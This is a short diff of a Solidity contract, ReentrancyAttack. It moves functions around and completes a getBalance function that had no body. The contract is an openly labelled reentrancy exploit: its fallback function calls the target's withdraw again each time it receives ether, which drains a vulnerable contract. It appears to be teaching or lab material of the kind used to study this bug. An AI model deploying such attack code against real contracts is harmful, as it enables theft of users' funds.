@@ -10,10 +10,8 @@ contract ReentrancyAttack {
         target = Reentrancy(_etherStoreAddress);
     }
 
-    fallback() external payable {
-        if (address(target).balance >= 0) {
-            target.withdraw (1 wei);
-        }
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 
     function attack() external payable {
@@ -21,5 +19,9 @@ contract ReentrancyAttack {
         target.withdraw(1 wei);
     }
 
-    function getBalance() public view returns (uint256)
+    fallback() external payable {
+        if (address(target).balance >= 0) {
+            target.withdraw (1 wei);
+        }
+    }
 }
